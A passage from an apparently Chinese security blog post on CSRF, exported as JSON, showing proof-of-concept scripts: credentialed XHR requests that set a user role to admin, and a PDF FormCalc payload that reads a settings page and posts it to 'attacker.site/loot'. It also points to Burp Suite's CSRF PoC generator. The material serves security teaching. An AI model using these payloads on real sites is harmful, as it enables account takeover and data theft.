class=\"string\">\"Content-Type\"</span>, <span class=\"string\">\"text/plain\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.send(<span class=\"string\">'&#123;\"role\":admin&#125;'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.open(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"http://www.example.com/api/setrole\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.withCredentials = <span class=\"literal\">true</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.setRequestHeader(<span class=\"string\">\"Content-Type\"</span>, <span class=\"string\">\"application/json;charset=UTF-8\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.send(<span class=\"string\">'&#123;\"role\":admin&#125;'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- pdf Exp--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">contentType</span>=<span class=\"string\">'application/x-formcalc'</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">var</span> content = GET(<span class=\"string\">\"https://example.com/Settings.action\"</span>); </span></span><br><span class=\"line\"><span class=\"actionscript\">  Post(<span class=\"string\">\"http://attacker.site/loot\"</span>,content,<span class=\"string\">\"text/plain\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编写CSRF的Poc以及利用工具：</p>\n<ul>\n<li>Burpsuite的CSRFPOC自动生成工具:Proxy-&gt;Intercept-&gt;右键-&gt;Engagement Tools-&gt;Generate CSRF PoC, 同时burpsuite还为我们提供了直接的测试功能可以直接在浏览器中打开url进行测试<br><img src=\"https://img.weiyigeek.top/2019/1/20190922162557.png\" alt=\"WeiyiGeek.\"></li>\n<li>PoC-CORS验证工具: <a href=\"https://github.com/nccgroup/CrossSiteContentHijacking\" target=\"_blank\" rel=\"noopener\">https://github.com/nccgroup/CrossSiteContentHijacking</a></li>\n</ul>\n</li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"前端漏洞","path":"api/categories/前端漏洞.json"}],"tags":[{"name":"CSRF","path":"api/tags/CSRF.json"}]}